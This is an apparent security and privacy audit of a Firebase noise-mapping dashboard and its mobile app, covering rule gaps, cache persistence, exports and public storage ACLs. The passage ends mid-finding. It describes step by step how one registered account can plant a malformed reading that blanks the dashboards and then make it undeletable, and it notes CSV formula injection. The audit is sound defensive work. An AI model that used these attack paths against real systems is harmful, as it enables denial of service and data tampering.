# Security Audit - Noise Pollution Mapper Web Dashboard

> Generated 2026-10-15 - multi-agent cross-repo audit, read-only. Dimension agents (security, data layer, correctness, React/Vite, UX, performance, build/deploy) read the dashboard repo (`noise-pollution-mapper-dashboard`, HEAD `353bbdd`) and the Flutter app (`noise_pollution_mapper`, master `9b08e68`) as its contract counterpart only. Every Critical/High finding was re-checked by an adversarial verifier; uncertain claims default to refuted. Production facts come from the owner-run read-only probe of 2026-10-16 ~00:20 (`prod_probe.json`, aggregates only, no PII). No file outside `audit/` was modified, `serviceAccountKey.json` was never opened, and no build, install or network call to Firebase was made by the audit.
>
> Status legend: `confirmed` = verifier re-proved it against the code; `partial` = mechanism confirmed, part of the claim corrected (corrections listed); `refuted` = disproved (kept for transparency, excluded from recommendations); `unverified` = not individually re-checked. Severity shown is the post-verification severity. Repo: `dashboard`, `app`, or `both`; "cross-repo" means the defect lives in the contract between the two clients.

## Executive Summary

Total findings in this area: **11** (0 Critical, 2 High, 6 Medium, 3 Low): 5 security (`sec-1`..`sec-5`) and 6 privacy (`priv-1`..`priv-6`). Three were adversarially verified: 1 confirmed, 2 partial (one of which was downgraded High to Medium).

There is **no access-control breach**. The deployed Firestore ruleset equals the checked-in ruleset of both repos (owner probe, see `03_CROSS_REPO_CONTRACT_AUDIT.md` section 1.1). Every rule the dashboard relies on behaves as written. No secret ships in the browser bundle. Stored XSS through Firestore fields was checked and refuted. The remaining risk falls into three themes:

1. **Rules validate identity, not shape** (`sec-1`, `sec-3`). Any self-registered account can write a `noise_readings` doc with any field types. The dashboard renders those fields with no error boundary, so one malformed doc blanks `/dashboard` and `/analytics` for every viewer, and the cache keeps it after the doc is deleted. The update rule's `deleted_user_*` escape hatch accepts any suffix, so an owner can make such a doc permanent and impossible for any client to delete.
2. **The browser cache never forgets** (`priv-1`, `priv-4`, `priv-5`). The IndexedDB cache is append/upsert-only and survives sign-out. Readings deleted in the app (Clear History, single delete, account deletion) stay on every dashboard browser that cached them, in maps, charts and both exports. Pre-2026-09-09 raw `userEmail` values stay at rest in browsers that synced before the backfill.
3. **One export path the 2026-09-09 remediation never covered** (`priv-2`, `sec-2`, `priv-3`). The browser CSV joins `users.email` (raw) onto exact coordinates for the one admin. It shows Firebase UIDs under an "email" header for everyone else, and its cells allow formula injection. The scheduled Cloud Function still calls `makePublic()`. That is harmless today only because no Storage bucket exists.

`sec-4` (any app account can open the research dashboard and bulk-export) is a policy gap rather than a rules bypass. The rules deliberately let every signed-in user read `noise_readings` because the app's community feed needs it.

## Summary Table

| ID | Severity | Title | Location | Status |
|----|----------|-------|----------|--------|
| sec-1 | High | Rules accept any field types on noise_readings and no error boundary exists, so one malformed doc from any registrant blanks /dashboard and /analytics for every viewer | `firestore.rules:106` (both) | confirmed |
| priv-1 | High | Delta sync never re-fetches updated or deleted readings, so deleted readings, account-deletion userId rewrites and pre-2026-09-09 raw emails stay cached in IndexedDB and get exported | `src/utils/syncManager.ts:135` (dashboard) | partial |
| priv-2 | Medium | Analytics 'User Email' column and CSV join raw users.email to exact GPS for the one admin and show raw Firebase UIDs to everyone else, ignoring the masked userEmail on each reading | `src/utils/exportHelpers.ts:77` (dashboard) | partial (downgraded from High) |
| sec-3 | Medium | noise_readings update rule lets an owner rewrite userId to any deleted_user_* value and change every other field | `firestore.rules:130` (both) | unverified |
| sec-4 | Medium | ProtectedRoute checks only isAuthenticated, so any self-registered app account gets the research dashboard and one-click bulk export | `src/components/ProtectedRoute.tsx:25` (dashboard) | unverified |
| priv-3 | Medium | Scheduled cache-export Cloud Function calls file.makePublic() on the full readings dump, a latent internet-wide exposure armed the moment a Storage bucket is created | `functions/src/cache-export.ts:115` (dashboard) | unverified |
| priv-4 | Medium | Sign-out leaves the origin-global IndexedDB readings cache (GPS, user labels) and the localStorage email in place | `src/components/Layout.tsx:29` (dashboard) | unverified |
| sec-2 | Medium | Browser CSV export allows formula and column injection from attacker-controlled locationName/soundClass fields | `src/utils/exportHelpers.ts:66` (dashboard) | unverified |
| priv-6 | Low | App offline-sync path falls back to the raw auth email for legacy queued readings, which then land unmasked in every dashboard IndexedDB | `noise_pollution_mapper/lib/services/sync_service.dart:308` (app) | unverified |
| priv-5 | Low | NoiseMarkers logs full reading objects with author label and GPS to the browser console on every filter recompute | `src/components/map/NoiseMarkers.tsx:145` (dashboard) | unverified |
| sec-5 | Low | vercel.json sets no security headers (CSP, frame-ancestors, nosniff) and its catch-all rewrite serves index.html for missing assets | `vercel.json:13` (dashboard) | unverified |

## Detailed Findings

### Critical

None. No finding in this area meets the Critical bar (breach, data loss, or a production feature dead today). The deployed rules match source, and the confirmed High (`sec-1`) is an attack path that no doc in production data triggers today.

### High

#### [sec-1] Rules accept any field types on noise_readings and no error boundary exists, so one malformed doc from any registrant blanks /dashboard and /analytics for every viewer

**Severity:** High | **Category:** security | **Repo:** both (cross-repo) | **Reported by:** security, correctness, react, ux

**Status:** confirmed. The verifier re-proved every step:
- The rules check only `userId` on create (`firestore.rules:106-108`) and on update (`:130-134`), and nothing else.
- FACTS says the deployed rules equal source, so no production check is needed.
- Sign-up is open: the app self-registers, and all 7 Auth users are email/password.
- `ProtectedRoute` needs only `isAuthenticated`.
- `CategoryChart.tsx:79` passes a map-typed `soundClass` through unchanged, and `:220` renders it as a React child, which throws.
- CategoryChart is mounted on `/dashboard` (`DashboardPage.tsx:167`, always rendered with 3,374 docs) and on `/analytics` (`AnalyticsPage.tsx:104`).
- The only boundary on those pages wraps the map (`DashboardPage.tsx:113-144`). Under React 19 an uncaught render error unmounts the whole root.
- Delivery: the delta query filters on `timestamp` only, so a doc with a valid Timestamp and a map `soundClass` is fetched. It is `put()` into IndexedDB and never evicted. Every later load renders from the cache first.
- Production data is well typed today, so this is an attack path, not a live crash. It is still a persistent denial of service on the default route from one write by any registrant: High.

Verifier corrections:
1. A non-Timestamp `timestamp` (map, number) is not matched by `where('timestamp','>',Timestamp)` (`syncManager.ts:84-87`, `:135-138`). It reaches a browser only through the first sync (`:112-115`) or a forced full sync (`:241-244`). A real Timestamp in year 9999 does not throw; it only skews the data.
2. 'Fetch All Readings' cures a browser only after the bad doc is deleted server-side. Only its owner (the attacker), the console or the Admin SDK can delete it (`firestore.rules:136-137`). With the root unmounted the viewer has no navigation and must type `/map` into the URL bar.
3. `NoiseMarkers.tsx:326` `toFixed` is not an unguarded sink, because `:150` drops readings whose `decibelLevel` is not a number. The map boundary is `MapPage.tsx:145`.
4. The fix needs care; see the Recommendation.

**Location:** `firestore.rules:106` (both repos, byte-identical blobs); sinks in `src/components/analytics/CategoryChart.tsx:79,220`, `src/components/analytics/DataTable.tsx:247`, `src/utils/exportHelpers.ts:73`, `src/components/analytics/StatsCards.tsx:12-19`, `src/components/analytics/NoiseTrendChart.tsx:42-43,82` (dashboard)

**Description:** The merged ruleset proves only who is writing, never what. Any account, including one created through the public Auth REST sign-up with the public web key, can create `noise_readings` docs whose `soundClass`, `locationName`, `decibelLevel` and other fields have any type, size or range. The dashboard casts raw Firestore data to `NoiseReading[]` (`syncManager.ts:90-93`, `db.ts:55`) and renders it with no normalisation and no route- or app-level error boundary. `components/GlobalErrorPage.tsx` exists but is imported nowhere (grep).

**Evidence:**
- `firestore.rules:106-108`: `allow create: if isSignedIn()` / `&& request.resource.data.userId is string` / `&& request.resource.data.userId == request.auth.uid;`
- `firestore.rules:130-134`: the update rule constrains only `userId` (see `sec-3`).
- `src/components/analytics/CategoryChart.tsx:79`: `const category = read.soundClass || read.soundCategory || 'Other';`. At `:220`: `{data.category}`.
- `src/pages/DashboardPage.tsx:113`: `<ErrorBoundary fallback={` wraps only `<MapComponent>` (`:139-143`). `:167`: `<CategoryChart />` sits outside it.
- `src/main.tsx:6-10` renders `<App />` with no boundary. `src/routes.tsx:38-45` wraps `/analytics` only in `<ProtectedRoute>`.
- `src/components/analytics/DataTable.tsx:247`: `{reading.decibelLevel.toFixed(1)} dB ({getNoiseLevelLabel(reading.decibelLevel)})`
- `src/utils/exportHelpers.ts:73`: `reading.decibelLevel.toFixed(1),`
- `src/components/analytics/StatsCards.tsx:12`: `.filter((db) => db !== undefined);`. At `:19`: `? Math.max(...decibelLevels)`
- `src/components/analytics/NoiseTrendChart.tsx:42-43`: `if (typeof ts === 'object' && 'seconds' in ts) {` / `return new Date(ts.seconds * 1000);`. At `:82`: `key = format(timestamp, 'yyyy-MM-dd');`
- Guarded counter-example: `src/components/map/NoiseMarkers.tsx:150`: `if (typeof reading.decibelLevel !== 'number') {`

**Impact:** An attacker registers any account and writes one doc such as `{userId: <own uid>, soundClass: {x: 1}, decibelLevel: 50, timestamp: <now>}`. On each viewer's next delta sync the doc enters IndexedDB. CategoryChart throws during render, and React unmounts the root, so `/dashboard` (the default route) and `/analytics` become blank pages for every viewer. They stay blank after the attacker deletes the doc, because the cache never evicts (`priv-1`). Combined with `sec-3`, the attacker can first rewrite the doc's `userId` to `deleted_user_*` so that no client can ever delete it. Softer variants silently corrupt research output without crashing:
- `decibelLevel: 1e300` becomes the Peak, and a string dB turns the average into `NaN`.
- a far-future timestamp lands on page 1 of the table.
- a 1 MB `locationName`.

**Recommendation:** Defend at both layers. The playbook (`08_FIX_IMPLEMENTATION_PLAYBOOK.md`) carries the exact edits.

**Rules** (edit in the app repo, the only deploy source; keep the dashboard copy byte-identical):
- Add a `validReading(d)` predicate covering:
  - type and range checks for `decibelLevel`, `latitude` and `longitude`;
  - `timestamp is timestamp`;
  - string type and size caps for `soundClass`, `soundType` and `locationName`;
  - a `0..1` range for `confidence`.
- Apply the full predicate on **create** and on the full-document `set()` retry.
- For the email-propagation update, validate only the changed key: `affectedKeys().hasOnly(['userEmail'])`. AND-ing the full predicate into every update would make a batch fail atomically on any legacy out-of-range doc.
- Allow `userEmail` to be `null`, because `sync_service.dart:308` can write null.
- Keep any future-timestamp clause loose. Offline uploads carry the device's capture clock (`sync_service.dart:319`).
- Before deploying, run the value-range production check (`03`, section 5, item P8). The probe's dB range output is a probe bug, so production ranges are still unknown.
- Add no index.

**Dashboard:**
- Add one `normalizeReading()` at the IndexedDB boundary (before `setManyReadings`). It drops docs whose `decibelLevel` is not a finite number or whose `soundClass`/`locationName`/`soundType` are not strings, and converts `timestamp` to epoch millis. This also fixes `bug-1`.
- Wrap the routes in `ErrorBoundary`, reusing `GlobalErrorPage`, and wrap each chart, the StatsCards and the DataTable individually.

---

#### [priv-1] Delta sync never re-fetches updated or deleted readings, so deleted readings, account-deletion userId rewrites and pre-2026-09-09 raw emails stay cached in IndexedDB and get exported

**Severity:** High | **Category:** privacy | **Repo:** dashboard (cross-repo) | **Reported by:** data, security, correctness

**Status:** partial. The root mechanism is CONFIRMED:
- Every non-first sync is `where('timestamp', '>', Timestamp.fromDate(lastSync))` (`syncManager.ts:84-87`, `:135-138`).
- Writes are upsert-only (`db.ts:93-95`), and `updatedCount: 0` is hard-coded (`:164`).
- The only row removal is `clearAllReadings` inside `clearSyncData` (`:222-226`). It is reached only from `forceFullSync` (`:232-267`), whose only caller is the manual 'Fetch All Readings' button behind a `confirm()` (`MapPage.tsx:33-49`).
- Sign-out does not clear the cache (`AuthContext.tsx:37-44`).
- Each app mutation leaves `timestamp` unchanged: Clear History, single delete, account deletion, email propagation, and the 2026-09-09 backfill.
- Deleted readings, with GPS, therefore persist in every browser that cached them. They feed the markers, heatmap, StatsCards, charts, DataTable and both exports, with no staleness indicator.
- On the admin browser, a stale original uid still resolves through the leftover `users/{uid}` doc, which holds the raw email.
- High stands: silently wrong totals, and deletion is not honoured, in every long-lived browser.

Verifier corrections:
1. Raw pre-backfill `userEmail` values are **not** exported or displayed. No dashboard code reads `reading.userEmail`: it is absent from `types/NoiseReading.ts:3-26`, and grep finds it nowhere in `src`. The CSV columns (`exportHelpers.ts:68-78`) and the JSON fields (`:109-126`) are fixed lists. The raw values sit only at rest in IndexedDB, through the `...doc.data()` spread, in browsers that synced before 2026-09-09 and never pressed 'Fetch All Readings'. "Get exported" in the title applies only to deleted readings and stale uids.
2. The account-deletion sub-case is latent. Production holds 0 `deleted_user_*` docs (probe). The raw-email-next-to-deleted-user case is admin-only, and exactly one admin exists.
3. Same root cause, missing from the finding: back-dated offline uploads are never fetched either. This is recorded separately as `data-1` in `03`.
4. Logout does not clear IndexedDB (see `priv-4`).
5. The marker badge flickers between the live count (`DashboardPage.tsx:34`) and the cached count (`DashboardPage.tsx:141` to `NoiseMarkers.tsx:76-77`).

**Location:** `src/utils/syncManager.ts:135` (dashboard); writers in `noise_pollution_mapper/lib/screens/settings_screen_enhanced.dart:970-973,1110-1114`, `lib/services/firebase_service.dart:300-301`, `lib/services/profile_sync_service.dart:80` (app)

**Description:** The dashboard's sync model assumes readings are immutable and never deleted. The app breaks both assumptions: it deletes readings and rewrites their `userId` and `userEmail`, and none of these mutations touch `timestamp`, the only field the delta sync looks at. So a browser only ever accumulates. The cached object is the whole Firestore document, spread verbatim, including fields the UI never shows (`userEmail`, `deviceInfo`, `createdAt`).

**Evidence:**
- `src/utils/syncManager.ts:135-138`: `const q = query(` / `collection(firebaseDb, 'noise_readings'),` / `where('timestamp', '>', Timestamp.fromDate(lastSync))`
- `src/utils/syncManager.ts:141-146`: `const data = doc.data() as NoiseReading;` / `return {` / `id: doc.id,` / `...data,`
- `src/utils/syncManager.ts:164`: `updatedCount: 0,`
- `src/utils/db.ts:93-95`: `export async function updateManyReadings(readings: NoiseReading[]): Promise<void> {` / `return setManyReadings(readings); // put() handles both insert and update`
- `src/utils/syncManager.ts:222-226`: `export async function clearSyncData(): Promise<void> {` / `await localDb.clearAllReadings();`
- `src/pages/MapPage.tsx:34`: `if (!confirm('This will clear the cache and fetch ALL readings from Firebase. This may take 2-3 minutes. Continue?')) {`
- App Clear History, `settings_screen_enhanced.dart:1113`: `(batch, ref) => batch.delete(ref),`
- App single delete, `firebase_service.dart:301`: `return _firestore.collection('noise_readings').doc(docId).delete();`
- App account deletion, `settings_screen_enhanced.dart:970-972`: `(batch, ref) => batch.update(ref, {` / `'userEmail': 'Deleted User',` / `'userId': 'deleted_user_${uid.substring(0, 8)}',`
- App email propagation, `profile_sync_service.dart:80`: `(batch, ref) => batch.update(ref, {'userEmail': authorDisplay}),`
- Leftover profile, `firestore.rules:175-177`: `the delete-account flow` / `anonymizes readings and deletes the Auth user but leaves this document` / `behind`. `profile_sync_service.dart:55-56`: `await _firestore.collection('users').doc(user.uid).set({` / `'email': authEmail,`
- `src/components/analytics/StatsCards.tsx:23`: `const uniqueUsers = new Set(readings.map((r) => r.userId).filter((id) => id !== undefined));`

**Impact:**
- **Clear History is not honoured.** User U taps Clear History, which deletes, say, 600 readings with GPS. Every dashboard browser that synced earlier keeps all 600 permanently: as markers, in the heatmap, StatsCards, trend/category/sound-type charts and the DataTable, and in both CSV and JSON exports. The app's "This will delete all your noise recordings" is not honoured on the research side.
- **Account deletion is defeated the same way.** Stale rows keep U's real uid. On the admin browser `fetchAllUsers` resolves that uid through the leftover `users/{uid}` doc, so the table and CSV print U's raw email next to readings U deleted.
- **Raw emails at rest.** Browsers that synced before 2026-09-09 still hold the pre-backfill raw `userEmail` values in IndexedDB, unseen in the UI but readable in DevTools.
- **Totals differ per browser.** 'Total Readings' and 'Active Users' differ from browser to browser with no indication.

**Recommendation:** Add bounded staleness, because the client cannot see deletes through a `timestamp >` query.
1. Make every full fetch a replace: clear, then `put`, as `forceFullSync` already does.
2. Run it automatically when the last full sync is older than about 24 hours, and whenever a `SCHEMA_VERSION` metadata key changes.
3. Ship the first fix with a one-time forced full replace, for example a `DB_VERSION` bump that drops and recreates the store. That purges deleted rows and pre-backfill raw emails from every existing browser.
4. Whitelist fields at the IndexedDB boundary so `userEmail`, `deviceInfo` and similar fields are never cached.
5. The cleaner long-term option: drop the hand-rolled cache and use the SDK's `persistentLocalCache` with one shared `onSnapshot`. It handles removed and modified docs natively. The full-collection `onSnapshot` already exists at `DashboardPage.tsx:33` (see `perf-1`).

None of this needs a composite index.

---

### Medium

#### [priv-2] Analytics 'User Email' column and CSV join raw users.email to exact GPS for the one admin and show raw Firebase UIDs to everyone else, ignoring the masked userEmail on each reading

**Severity:** Medium (reported High; downgraded by verifier) | **Category:** privacy | **Repo:** dashboard | **Reported by:** security, data, correctness, ux, react

**Status:** partial. The code path is CONFIRMED:
- `AnalyticsPage.tsx:26-30` calls `fetchAllUsers()` unconditionally on mount.
- `userService.ts:17-18` lists the whole `users` collection and maps `email: data.email || null` (`:24`). That is the raw address the app writes at `registration_screen.dart:62`, `edit_profile_screen.dart:92` and `profile_sync_service.dart:56`.
- The value is rendered at `DataTable.tsx:282` under the 'User Email' header (`:209`) and exported at `exportHelpers.ts:77` (header `:24`), next to the lat/lng columns.
- Rules: `users` read is `isOwner(userId) || isAdmin()` (`firestore.rules:157`), so an unfiltered list succeeds only for an admin.
- Production: exactly one `users` doc has `role:'admin'` (probe). Both halves of the claim are therefore real.

Why the severity is lower than reported:
- The only account that can produce the raw-email+GPS view or CSV is the project owner, who already holds Admin-SDK and console access to the same data. Role cannot be self-assigned (`firestore.rules:163-173`).
- So this is a data-minimisation and handling regression against the "mask every export" policy of `d1fb172`, not an access-control breach.
- The non-admin half is a mislabelled column. The UIDs it shows are no new exposure, because every signed-in user can already read `noise_readings.userId`.

Verifier corrections:
1. Admin provisioning is settled by the probe: there is one admin.
2. Coordinates may be rounded when the app's `anonymize_location` preference is on.
3. The non-admin defect is the mislabelled header plus the silent failure (`userService.ts:28-30`).
4. Read "was never covered by `d1fb172`" rather than "bypasses" it: `d1fb172` masked the Admin-SDK export scripts and functions, not this browser path.
5. The rules simplification in the Recommendation is a policy choice.

**Location:** `src/utils/exportHelpers.ts:77`; also `src/components/analytics/DataTable.tsx:282`, `src/services/userService.ts:17-30`, `src/pages/AnalyticsPage.tsx:26-30` (dashboard)

**Description:** Every reading already carries a privacy-safe author label in `userEmail`: masked `abc***@domain`, the display name, or `'Deleted User'`, written by `firebase_service.dart:165-168`. The dashboard ignores it, because the field is not even declared in `types/NoiseReading.ts:3-26`. Instead it joins each row to the `users` collection, whose `email` field is the raw address. The result depends on who is signed in:
- For the admin, the table and every CSV pair each contributor's raw email with precise latitude and longitude per row. That is the same email+GPS shape that leaked on GitHub.
- For everyone else the list is denied. The error is swallowed, and the 'User Email' column and CSV header silently contain 28-character Firebase UIDs, or `deleted_user_xxxxxxxx`.

**Evidence:**
- `src/pages/AnalyticsPage.tsx:26-30`: `useEffect(() => {` / `fetchAllUsers().then((map) => {` / `setUserMap(map);`
- `src/services/userService.ts:17-18`: `const usersRef = collection(db, 'users');` / `const snapshot = await getDocs(usersRef);`
- `src/services/userService.ts:24`: `email: data.email || null,`
- `src/services/userService.ts:28-30`: `} catch (error) {` / `console.error('[fetchAllUsers] Error fetching users:', error);` / `}`
- `src/components/analytics/DataTable.tsx:209`: `<TableHead>User Email</TableHead>`. At `:282`: `{userMap?.get(reading.userId)?.email || reading.userId || 'Unknown'}`
- `src/utils/exportHelpers.ts:24`: `'User Email'`. At `:77`: `` `"${userMap?.get(reading.userId)?.email || reading.userId || 'Unknown'}"` ``
- `firestore.rules:157`: `allow read: if isOwner(userId) || isAdmin();`
- App raw writes: `registration_screen.dart:62` `'email': _emailController.text.trim(),`; `edit_profile_screen.dart:92` `'email': user.email,`; `profile_sync_service.dart:56` `'email': authEmail,`
- App masked label on every reading: `firebase_service.dart:165` `'userEmail': authorLabel(`

**Impact:**
- **Admin:** an ordinary "Export CSV" click produces a file of raw emails joined to location trails. That file is easy to mis-handle (email it, commit it, upload it), which is exactly how the 2026-09-09 incident happened.
- **Everyone else:** the 'User Email' column holds opaque UIDs and gives no sign that the lookup failed. Research exports carry a mislabelled column.

**Recommendation:**
- Add `userEmail?: string` to `NoiseReading`.
- Render and export `reading.userEmail || 'Anonymous'` under a header such as 'Contributor'.
- Delete `fetchAllUsers`/`getUserEmail`, the `userMap` state and the `userMap` props.
- If the owner genuinely needs raw emails, show them on screen behind an explicit admin-only reveal, never in the export.
- Once nothing lists `users`, `isAdmin()` has no consumer. `users` read can then become `isOwner(userId)` in both rules copies, deployed from the app repo with `--only firestore:rules,firestore:indexes` after showing the diff. That is a policy decision for the owner.

---

#### [sec-3] noise_readings update rule lets an owner rewrite userId to any deleted_user_* value and change every other field

**Severity:** Medium | **Category:** security | **Repo:** both (cross-repo) | **Reported by:** security

**Status:** unverified (not individually re-checked). The writer re-opened the cited rule and app write, and they read as quoted. Production has 0 `deleted_user_*` docs (probe), so no abuse and no legitimate anonymization has happened yet.

**Location:** `firestore.rules:130` (both repos)

**Description:** The 2026-09-09 guard against reassigning a reading to an arbitrary uid is present and deployed. It admits any `userId` that matches `^deleted_user_.*`, with no constraint on the suffix. Neither branch of the update rule restricts which keys may change. The handoff's concern (b) is therefore resolved for live uids but not for the `deleted_user_` namespace (see `03`, section 1.3).

**Evidence:**
- `firestore.rules:130-134`: `allow update: if isSignedIn()` / `&& resource.data.userId == request.auth.uid` / `&& request.resource.data.userId is string` / `&& (request.resource.data.userId == resource.data.userId` / `|| request.resource.data.userId.matches('^deleted_user_.*'));`
- `firestore.rules:136-137`: `allow delete: if isSignedIn()` / `&& resource.data.userId == request.auth.uid;`
- App's only legitimate rewrite, `settings_screen_enhanced.dart:971-972`: `'userEmail': 'Deleted User',` / `'userId': 'deleted_user_${uid.substring(0, 8)}',`
- `src/components/analytics/StatsCards.tsx:23-24`: distinct `userId` values become `activeContributors`.

**Impact:**
- An owner can attribute their readings to `deleted_user_` plus the 8-character prefix of another user's uid. Uids are readable by every signed-in user, so this plants data in a real deleted account's bucket.
- Arbitrary suffixes inflate the dashboard's 'Active Users'.
- After the rewrite no client can update or delete the doc, because `auth.uid` never equals `deleted_user_*`. Combined with `sec-1`, this lets an attacker mint permanent poison docs that only the console or Admin SDK can remove.
- The same update may change `decibelLevel`, `timestamp`, coordinates, `soundClass` and `userEmail` at will.

**Recommendation:**
- Constrain the rewrite branch to the exact value the app writes: `request.resource.data.userId == 'deleted_user_' + request.auth.uid[0:8] && request.resource.data.userEmail == 'Deleted User' && request.resource.data.diff(resource.data).affectedKeys().hasOnly(['userId','userEmail'])`.
- Keep the same-`userId` branch and add `sec-1`'s validation to it.
- This still admits the app's three legitimate updates: the anonymization `batch.update`, the sync-retry `set()` with the same `userId`, and email propagation.
- Prove it in the Firestore emulator before deploying from the app repo. The exact rule text is in the playbook.

---

#### [sec-4] ProtectedRoute checks only isAuthenticated, so any self-registered app account gets the research dashboard and one-click bulk export

**Severity:** Medium | **Category:** security | **Repo:** dashboard (cross-repo) | **Reported by:** security, react

**Status:** unverified (not individually re-checked). The probe confirms the precondition: 7 Auth users, all email/password, and the app self-registers.

**Location:** `src/components/ProtectedRoute.tsx:25` (dashboard)

**Description:** The dashboard's only gate is "is there a Firebase user". The Auth project is the app's, which lets anyone register. The login copy and the 'Request access' mailto imply a gated research tool, and `UserFilterToggle.tsx:22` calls the default view "secure". Neither is backed by any check. The rules already let every signed-in user read every reading, because the app's community feed requires it. So this is defence in depth and a misleading access model, not a rules bypass.

**Evidence:**
- `src/components/ProtectedRoute.tsx:25-30`: `if (!isAuthenticated) {` / `return <Navigate to="/login" replace />;` / `}` / ... / `return <Layout>{children}</Layout>;`
- `src/pages/LoginPage.tsx:149`: `Sign in to access your research dashboard`. At `:259`: `href="mailto:admin@noisemapper.lk?subject=Dashboard Access Request"`
- `src/components/map/UserFilterToggle.tsx:22`: `* Default: My Readings Only (secure, minimal Firebase reads)`
- `firestore.rules:97`: `allow read: if isSignedIn();`
- `src/pages/AnalyticsPage.tsx:121`: `onClick={() => exportToCSV(readings, userMap, 'noise_readings')}`. At `:132`: `onClick={() => exportToJSON(readings, 'noise_readings')}`
- `src/utils/exportHelpers.ts:125`: `userId: reading.userId || 'Unknown'`

**Impact:** A stranger installs the app, or calls the Auth sign-up endpoint with the public web key, then signs in to the dashboard. One click downloads every contributor's coordinates and timestamps keyed by `userId`, from which home and work locations can be inferred. The same data is reachable through the SDK anyway. The dashboard just packages it as a ready-made research export.

**Recommendation:**
- Decide the policy.
- If the dashboard is staff-only: gate `ProtectedRoute` (or at least `/analytics` and the exports) on the caller's own `users/{uid}.role == 'admin'`. Owner read is allowed, and exactly one such doc exists. Alternatively, use an Admin-SDK custom claim read through `getIdTokenResult()`. Render a "no access" page otherwise.
- If the dashboard is meant to be community-wide: remove the 'Request access' and "secure" wording.
- Either way, align the copy with the actual model.

---

#### [priv-3] Scheduled cache-export Cloud Function calls file.makePublic() on the full readings dump, a latent internet-wide exposure armed the moment a Storage bucket is created

**Severity:** Medium | **Category:** privacy | **Repo:** dashboard | **Reported by:** data, security, build

**Status:** unverified (not individually re-checked). Whether the functions are deployed at all is open: production check P9 in `03`, section 5. The bucket's absence is settled (FACTS).

**Location:** `functions/src/cache-export.ts:115` (compiled copy `functions/lib/cache-export.js:137,182`) (dashboard)

**Description:** Both scheduled exports upload the whole `noise_readings` collection with `predefinedAcl: "projectPrivate"`, then immediately call `file.makePublic()`. The code comment says "publicly accessible to authenticated users", but `makePublic()` grants the GCS `allUsers` reader role: anyone, with no authentication. The rows are `{ id, ...data, userEmail: maskAuthor(...) }`. The email is masked, but `userId`, exact `latitude`/`longitude` and timestamps are kept. The only browser consumer fetches the object without any token. `storage.rules:58-61` itself records that the download works only because of the public ACL. The project has no Storage bucket, so the functions, if deployed, fail at the first Storage call every day.

**Evidence:**
- `functions/src/cache-export.ts:105`: `predefinedAcl: "projectPrivate",`
- `functions/src/cache-export.ts:114-115`: `// Make file publicly accessible to authenticated users` / `await file.makePublic();`. The same call is at `:167`.
- `functions/src/cache-export.ts:52-56`: `return {` / `id: doc.id,` / `...data,` / `userEmail: maskAuthor(data.userEmail),`
- `functions/src/cache-export.ts:63-67`: `schedule: "0 2 * * *", // 2:00 AM UTC daily` ... `retryCount: 3,`
- `src/utils/cacheDownloader.ts:15`: `const CACHE_FILE_URL = 'https://firebasestorage.googleapis.com/v0/b/noise-pollution-mapper-9ad3d.appspot.com/o/cache%2Fnoise-readings-master-cache.json?alt=media';` (fetched unauthenticated at `:52`)
- `src/components/map/CacheStatus.tsx`, the only importer of `cacheDownloader`, is imported by no file (grep).
- `storage.rules:58-61`: `request.auth is null. Its` / `download works in production only because the Cloud Function calls` / `file.makePublic() (functions/src/cache-export.ts), i.e. a public GCS` / `object ACL — outside these rules.`

**Impact:** Inert today, but armed. Enabling Storage in the console creates the default bucket. The next 02:00 UTC run would then publish every contributor's location trail at a guessable, unauthenticated URL. That is the same class of exposure as the GitHub incident. If the functions are deployed, they also produce three failing retries a day of log noise.

**Recommendation:**
- Delete `exportCacheDaily` and `exportCacheWeekly`, the dead `cacheDownloader.ts`, `CacheStatus.tsx` and `scripts/upload-cache.sh`, plus the `cacheDownloaded` branch at `syncManager.ts:75-99` (see `arch-2`).
- If any are deployed, also run `firebase functions:delete` from a context that targets this project.
- If a shared cache is ever wanted, keep the object private, drop `userId`, and serve it through an authenticated `getDownloadURL` gated by `storage.rules`. Never use `makePublic()`.

---

#### [priv-4] Sign-out leaves the origin-global IndexedDB readings cache (GPS, user labels) and the localStorage email in place

**Severity:** Medium | **Category:** privacy | **Repo:** dashboard | **Reported by:** security, data, react

**Status:** unverified (not individually re-checked). The verifier of `priv-1` independently confirmed the core fact: logout does not clear IndexedDB, and there is no other clear path.

**Location:** `src/components/Layout.tsx:29` (dashboard)

**Description:** Sign-out calls only `firebaseSignOut`. The IndexedDB database `noise-pollution-db` is not tied to any account and outlives the session. It holds every reading of every user, including coordinates, `userId`, the `userEmail` label, and raw emails in caches synced before 2026-09-09. 'Remember me' writes the user's email to `localStorage`, and nothing reads it back, so the key persists for no feature. Under today's rules there is no cross-account data leak, because every signed-in user may read all readings anyway, and the 'My readings' filter keys on the current uid. The exposure is to whoever uses the browser profile next, with no credentials at all.

**Evidence:**
- `src/components/Layout.tsx:27-30`: `const handleSignOut = async () => {` / `try {` / `await signOut();` / `navigate('/login');`
- `src/contexts/AuthContext.tsx:37-39`: `const signOut = async () => {` / `try {` / `await firebaseSignOut(auth);`
- `src/utils/db.ts:10`: `const DB_NAME = 'noise-pollution-db';`
- `src/utils/syncManager.ts:222-223`: `export async function clearSyncData(): Promise<void> {` / `await localDb.clearAllReadings();` has no caller other than `forceFullSync`.
- `src/pages/LoginPage.tsx:37-38`: `if (rememberMe) {` / `localStorage.setItem('remembered_email', email);`. At `:23`: `const [email, setEmail] = useState('');`, the stored value is never read.

**Impact:** On a shared or lab computer, after the researcher signs out, anyone using that browser profile can open DevTools and read the full location dataset without credentials. The next person to sign in sees the previous cache instantly. The researcher's own email also stays in `localStorage`.

**Recommendation:**
- In the sign-out path, call `syncManager.clearSyncData()` (or `indexedDB.deleteDatabase`) and `localStorage.removeItem('remembered_email')` before `firebaseSignOut`.
- Optionally record a `cacheOwnerUid` metadata key and clear the cache when `onAuthStateChanged` reports a different uid.
- Either implement the 'Remember me' prefill or remove the dead write.

---

#### [sec-2] Browser CSV export allows formula and column injection from attacker-controlled locationName/soundClass fields

**Severity:** Medium | **Category:** security | **Repo:** dashboard | **Reported by:** security, correctness

**Status:** unverified (not individually re-checked). The writer re-opened `exportHelpers.ts:61-89` and the quotes below match.

**Location:** `src/utils/exportHelpers.ts:66` (dashboard)

**Description:** The CSV builder treats the cells inconsistently:
- `locationName` has its double quotes doubled, but a leading `=`, `+`, `-` or `@` is not neutralised.
- The category, type and user cells are wrapped in quotes without escaping any embedded quote.
- Latitude and longitude are emitted unquoted and unvalidated, and the rules allow strings there.
- The user cell comes from `users.email`, which the owner may set to any string, because `firestore.rules:172-173` guards only `role`.

The file is explicitly prepared for Excel with a UTF-8 BOM.

**Evidence:**
